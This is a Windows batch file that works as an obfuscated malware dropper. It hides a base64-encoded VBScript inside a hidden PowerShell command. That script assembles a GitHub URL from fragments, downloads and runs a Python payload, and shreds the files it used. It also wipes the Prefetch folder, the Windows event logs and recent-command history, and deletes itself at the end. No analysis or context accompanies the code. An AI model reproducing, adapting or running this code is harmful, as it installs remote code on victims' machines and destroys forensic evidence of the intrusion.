@echo off
setlocal enabledelayedexpansion

if not "%1"=="worker" (
    set "tempbat=%TEMP%\~w!RANDOM!!RANDOM!.bat"
    copy /y "%~f0" "!tempbat!" >nul 2>&1
    if exist "!tempbat!" (
        start /b cmd /c call "!tempbat!" worker
        timeout /t 2 /nobreak >nul
        del /f /q "%~f0" >nul 2>&1
    )
    exit /b
)

set "vbsfile=%TEMP%\~init!RANDOM!.vbs"

powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command ^
"$b64 = 'T24gRXJyb3IgUmVzdW1lIE5leHQKUmFuZG9taXplClNldCBmc28gPSBDcmVhdGVPYmplY3QoIlNjcmlwdGluZy5GaWxlU3lzdGVtT2JqZWN0IikKU2V0IHNoZWxsID0gQ3JlYXRlT2JqZWN0KCJXU2NyaXB0LlNoZWxsIikKc2NyaXB0UGF0aCA9IFdTY3JpcHQuU2NyaXB0RnVsbE5hbWUKc2NyaXB0TmFtZSA9IGZzby5HZXRGaWxlTmFtZShzY3JpcHRQYXRoKQpzY3JpcHREaXIgPSBmc28uR2V0UGFyZW50Rm9sZGVyTmFtZShzY3JpcHRQYXRoKQp0ZW1wQmFzZSA9IHNoZWxsLkV4cGFuZEVudmlyb25tZW50U3RyaW5ncygiJVRFTVAlIikKSWYgSW5TdHIoTENhc2Uoc2NyaXB0UGF0aCksIExDYXNlKHRlbXBCYXNlKSkgPiAwIEFuZCBMQ2FzZShzY3JpcHROYW1lKSA9ICJjb3JlLnZicyIgVGhlbgpleGVQYXRoID0gIiIKRm9yIEVhY2ggZiBJbiBmc28uR2V0Rm9sZGVyKHNjcmlwdERpcikuRmlsZXMKSWYgTENhc2UoUmlnaHQoZi5OYW1lLCA0KSkgPSAiLmV4ZSIgVGhlbgpleGVQYXRoID0gZi5QYXRoCkV4aXQgRm9yCkVuZCBJZgpOZXh0CnUxID0gImh0dHBzOi8vIgp1MiA9ICJnaXRodWIuIgp1MyA9ICJjb20vIgp1NCA9ICJicmF5YW4iCnU1ID0gImpob2FuY2UiCnU2ID0gIjItY29sbGFiLyIKdTcgPSAiZW5jcmlwIgp1OCA9ICJ0YWRvLyIKdTkgPSAiYXJjaGl2ZS8iCnUxMCA9ICJyZWZzL2hlYWRzLyIKdTExID0gIm1haW4uemlwIgpyZXBvVVJMID0gdTEgJiB1MiAmIHUzICYgdTQgJiB1NSAmIHU2ICYgdTcgJiB1OCAmIHU5ICYgdTEwICYgdTExCnpEID0gc2NyaXB0RGlyICYgIlwiOiB6TiA9ICIiCkZvciBpID0gMSBUbyA4OiB6TiA9IHpOICYgQ2hyKEludChSbmQgKiAyNikgKyA5Nyk6IE5leHQKemlwUGF0aCA9IHpEICYgek4gJiAiLnRtcCIKZUQgPSBzY3JpcHREaXIgJiAiXCI6IGVOID0gIiIKRm9yIGkgPSAxIFRvIDc6IGVOID0gZU4gJiBDaHIoSW50KFJuZCAqIDI2KSArIDk3KTogTmV4dApleHRyYWN0UGF0aCA9IGVEICZ6Tgpwc0Rvd25sb2FkID0gInBvd2Vyc2hlbGwuZXhlIC1XaW5kb3dTdHlsZSBIaWRkZW4gLU5vUHJvZmlsZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtQ29tbWFuZCAiIiIgJiBfCiJbTmV0LlNlcnZpY2VQb2ludE1hbmFnZXJdOjpTZWN1cml0eVByb3RvY29sID0gW05ldC5TZWN1cml0eVByb3RvY29sVHlwZV06OlRsczEyOyAiICYgXwoiJFByb2dyZXNzUHJlZmVyZW5jZSA9ICdTaWxlbnRseUNvbnRpbnVlJzsgIiAmIF8KIiRFcnJvckFjdGlvblByZWZlcmVuY2UgPSAnU2lsZW50bHlDb250aW51ZSc7ICIgJiBfCiJ0cnkgeyAiICYgXwoiICAgICR3YyA9IE5ldy1PYmplY3QgTmV0LldlYkNsaWVudDsgIiAmIF8KIiAgICAkd2MuSGVhZGVycy5BZGQoJ1VzZXItQWdlbnQnLCAnTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2Jyk7ICIgJiBfCiIgICAgJHdjLkRvd25sb2FkRmlsZSgnIiAmIHJlcG9VUkwgJiAiJywgJyIgJiB6aXBQYXRoICYgIicpOyAiICYgXwoiICAgIEV4cGFuZC1BcmNoaXZlIC1QYXRoICciICYgemlwUGF0aCAmICInIC1EZXN0aW5hdGlvblBhdGggJyIgJiBleHRyYWN0UGF0aCAmICInIC1Gb3JjZSAiICYgXwoifSBjYXRjaCB7IGV4aXQgMSB9ICIgJiBfCiIiIiIKc2hlbGwuUnVuIHBzRG93bmxvYWQsIDAsIFRydWUKV1NjcmlwdC5TbGVlcCA4MDAwCklmIE5vdCBmc28uRmlsZUV4aXN0cyh6aXBQYXRoKSBUaGVuCldTY3JpcHQuUXVpdApFbmQgSWYKV1NjcmlwdC5TbGVlcCAyMDAwCnJlcG9QYXRoID0gIiIKbGF1bmNoZXJQYXRoID0gIiIKcHl0aG9uUGF0aCA9ICIiCklmIGZzby5Gb2xkZXJFeGlzdHMoZXh0cmFjdFBhdGgpIFRoZW4KRm9yIEVhY2ggc3ViZm9sZGVyIEluIGZzby5HZXRGb2xkZXIoZXh0cmFjdFBhdGgpLlN1YkZvbGRlcnMKSWYgTENhc2Uoc3ViZm9sZGVyLk5hbWUpID0gImVuY3JpcHRhZG8tbWFpbiIgVGhlbgpyZXBvUGF0aCA9IHN1YmZvbGRlci5QYXRoCmxhdW5jaGVyUGF0aCA9IHJlcG9QYXRoICYgIlxsYXVuY2hlci5weSIKcHl0aG9uUGF0aCA9IHJlcG9QYXRoICYgIlxweXRob25fcG9ydGFibGVccHl0aG9uLmV4ZSIKRXhpdCBGb3IKRW5kIElmCk5leHQKRW5kIElmCklmIHJlcG9QYXRoIDw+ICIiIEFuZCBmc28uRmlsZUV4aXN0cyhsYXVuY2hlclBhdGgpIEFuZCBmc28uRmlsZUV4aXN0cyhweXRob25QYXRoKSBUaGVuCnNoZWxsLkN1cnJlbnREaXJlY3RvcnkgPSByZXBvUGF0aApjbWRMYXVuY2ggPSAiIiIiICYgcHl0aG9uUGF0aCAmICIiIiAiIiIgJiBsYXVuY2hlclBhdGggJiAiIiIKc2hlbGwuUnVuIGNtZExhdW5jaCwgMCwgRmFsc2UKV1NjcmlwdC5TbGVlcCAxMDAwMApFbmQgSWYKSWYgZXhlUGF0aCA8PiAiIiBBbmQgZnNvLkZpbGVFeGlzdHMoZXhlUGF0aCkgVGhlbgpGb3IgaSA9IDEgVG8gNQpTZXQgZncgPSBmc28uT3BlblRleHRGaWxlKGV4ZVBhdGgsIDIpCkZvciBqID0gMSBUbyAyMDAwCmZ3LldyaXRlTGluZSBTdHJpbmcoMTI4LCBDaHIoSW50KFJuZCAqIDI1NikpKQpOZXh0CmZ3LkNsb3NlCldTY3JpcHQuU2xlZXAgMzAwCk5leHQKZnNvLkRlbGV0ZUZpbGUgZXhlUGF0aCwgVHJ1ZQpFbmQgSWYKV1NjcmlwdC5TbGVlcCAzMDAwCklmIGZzby5GaWxlRXhpc3RzKHppcFBhdGgpIFRoZW4KemlwU2l6ZSA9IGZzby5HZXRGaWxlKHppcFBhdGgpLlNpemUKSWYgemlwU2l6ZSA+IDAgQW5kIHppcFNpemUgPCAyMDAwMDAwMDAgVGhlbgpGb3IgcGFzcyA9IDEgVG8gNQpwc1NocmVkID0gInBvd2Vyc2hlbGwuZXhlIC1XaW5kb3dTdHlsZSBIaWRkZW4gLU5vUHJvZmlsZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtQ29tbWFuZCAiIiIgJiBfCiIkRXJyb3JBY3Rpb25QcmVmZXJlbmNlID0gJ1NpbGVudGx5Q29udGludWUnOyAiICYgXwoiJGJ5dGVzID0gTmV3LU9iamVjdCBieXRlW10gIiAmIHppcFNpemUgJiAiOyAiICYgXwoiKE5ldy1PYmplY3QgUmFuZG9tKS5OZXh0Qnl0ZXMoJGJ5dGVzKTsgIiAmIF8KIltJTy5GaWxlXTo6V3JpdGVBbGxCeXRlcygnIiAmIHppcFBhdGggJiAiJywgJGJ5dGVzKSAiICYgXwoiIiIiCnNoZWxsLlJ1biBwc1NocmVkLCAwLCBUcnVlCldTY3JpcHQuU2xlZXAgNTAwCk5leHQKRW5kIElmCmZzby5EZWxldGVGaWxlIHppcFBhdGgsIFRydWUKRW5kIElmCklmIGZzby5Gb2xkZXJFeGlzdHMoZXh0cmFjdFBhdGgpIFRoZW4KRm9yIHBhc3MgPSAxIFRvIDMKRm9yIEVhY2ggZiBJbiBmc28uR2V0Rm9sZGVyKGV4dHJhY3RQYXRoKS5GaWxlcwpmU2l6ZSA9IGYuU2l6ZQpJZiBmU2l6ZSA+IDAgQW5kIGZTaXplIDwgNTAwMDAwMDAgVGhlbgpwc1NocmVkRiA9ICJwb3dlcnNoZWxsLmV4ZSAtV2luZG93U3R5bGUgSGlkZGVuIC1Ob1Byb2ZpbGUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUNvbW1hbmQgIiIiICYgXwoiJEVycm9yQWN0aW9uUHJlZmVyZW5jZSA9ICdTaWxlbnRseUNvbnRpbnVlJzsgIiAmIF8KIiRiID0gTmV3LU9iamVjdCBieXRlW10gIiAmIGZTaXplICYgIjsgIiAmIF8KIihOZXctT2JqZWN0IFJhbmRvbSkuTmV4dEJ5dGVzKCRiKTsgIiAmIF8KIltJTy5GaWxlXTo6V3JpdGVBbGxCeXRlcygnIiAmIGYuUGF0aCAmICInLCAkYikgIiAmIF8KIiIiIgpzaGVsbC5SdW4gcHNTaHJlZEYsIDAsIFRydWUKV1NjcmlwdC5TbGVlcCAyMDAKRW5kIElmCk5leHQKV1NjcmlwdC5TbGVlcCA1MDAKO2V4dApmcy5EZWxldGVGb2xkZXIgZXh0cmFjdFBhdGgsIFRydWUKRW5kIElmCnBzQ2xlYXIgPSAicG93ZXJzaGVsbC5leGUgLVdpbmRvd1N0eWxlIEhpZGRlbiAtTm9Qcm9maWxlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1Db21tYW5kICIiIiAmIF8KIiRFcnJvckFjdGlvblByZWZlcmVuY2UgPSAnU2lsZW50bHlDb250aW51ZSc7ICIgJiBfCiJSZW1vdmUtSXRlbSAnQzpcV2luZG93c1xQcmVmZXRjaFwqLnBmJyAtRm9yY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWU7ICIgJiBfCiJDbGVhci1SZWN5Y2xlQmluIC1Gb3JjZSAtQ29uZmlybTokZmFsc2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWU7ICIgJiBfCiJ3ZXZ0dXRpbCBjbCBBcHBsaWNhdGlvbiAyPiRudWxsOyAiICYgXwoid2V2dHV0aWwgY2wgU3lzdGVtIDI+JG51bGw7ICIgJiBfCiJ3ZXZ0dXRpbCBjbCBTZWN1cml0eSAyPiRudWxsOyAiICYgXwoiUmVtb3ZlLUl0ZW1Qcm9wZXJ0eSAtUGF0aCAnSEtDVTpcU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cRXhwbG9yZXJcUnVuTVJVJyAtTmFtZSAnKicgLUZvcmNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlICIgJiBfCiIiIiIKc2hlbGwuUnVuIHBzQ2xlYXIsIDAsIFRydWUKV1NjcmlwdC5TbGVlcCAzMDAwCmNsZWFudXBCYXQgPSBzY3JpcHREaXIgJiAiXGNsZWFudXAuYmF0IgpTZXQgZmMgPSBmc28uQ3JlYXRlVGV4dEZpbGUoY2xlYW51cEJhdCwgVHJ1ZSkKZmMuV3JpdGVMaW5lICJAZWNobyBvZmYiCmZjLldyaXRlTGluZSAidGltZW91dCAvdCAxMCAvbm9icmVhayA+bnVsIgpmYy5Xcml0ZUxpbmUgInRhc2traWxsIC9mIC9pbSB3c2NyaXB0LmV4ZSA+bnVsIDI+JjEiCmZjLldyaXRlTGluZSAidGFza2tpbGwgL2YgL2ltIHB5dGhvbi5leGUgPm51bCAyPiYxIgpmYy5Xcml0ZUxpbmUgImRlbCAvZiAvcSAiIiIgJiBzY3JpcHRQYXRoICYgIiIiID5udWwgMj4mMSIKZmMuV3JpdGVMaW5lICJjZCAvZCAlVEVNUCUiCmZjLldyaXRlTGluZSAicm1kaXIgL3MgL3EgIiIiICYgc2NyaXB0RGlyICYgIiIiID5udWwgMj4mMSIKZmMuV3JpdGVMaW5lICIoZ290bykgMj5udWwgJiBkZWwgL2YgL3EgIiIlfmYwIiIgJiBleGl0IgpmYy5DbG9zZQpzaGVsbC5SdW4gImNtZC5leGUgL2MgIiIiICYgY2xlYW51cEJhdCAmICIiIiIsIDAsIEZhbHNlCldTY3JpcHQuUXVpdApFbHNlCnRlbXBJRCA9ICJzeXNfIiAmIEludChSbmQgKiA5OTk5OTkgKyAxMDAwMDApCnRlbXBXb3JrID0gdGVtcEJhc2UgJiAiXCIgJiB0ZW1wSUQKZnNvLkNyZWF0ZUZvbGRlciB0ZW1wV29yawp2YnNUZW1wID0gdGVtcFdvcmsgJiAiXGNvcmUudmJzIgpmcy5Db3B5RmlsZSBzY3JpcHRQYXRoLCB2YnNUZW1wLCBUcnVlCnNoZWxsLlJ1biAid3NjcmlwdC5leGUgIiIiICYgdmJzVGVtcCAmICIiIiAvL0IgLy9Ob2xvZ28iLCAwLCBGYWxzZQpXU2NyaXB0LlNsZWVwIDIwMDAKZnNvLkRlbGV0ZUZpbGUgc2NyaXB0UGF0aCwgVHJ1ZQpXU2NyaXB0LlF1aXQKRW5kIElm'; ^
$bytes = [Convert]::FromBase64String($b64); ^
[IO.File]::WriteAllBytes('%vbsfile%', $bytes)"

timeout /t 2 /nobreak >nul

if exist "%vbsfile%" (
    start /b wscript.exe "%vbsfile%" //B //Nologo
    timeout /t 3 /nobreak >nul
)

del /f /q "%~f0" >nul 2>&1
exit